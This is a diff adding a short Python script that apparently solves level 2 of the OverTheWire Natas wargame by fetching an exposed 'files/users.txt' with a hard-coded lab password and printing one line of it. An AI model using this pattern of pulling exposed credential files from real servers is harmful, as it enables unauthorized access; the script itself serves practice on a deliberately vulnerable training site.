@@ -1,0 +1,8 @@
+import requests
+from requests.auth import HTTPBasicAuth
+
+url = 'http://natas2.natas.labs.overthewire.org/'
+password = 'TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI' # change to actual password
+
+r = requests.get(url=url+'files/users.txt', auth=HTTPBasicAuth('natas2',password=password))
+print(r.text.split('\n')[4])
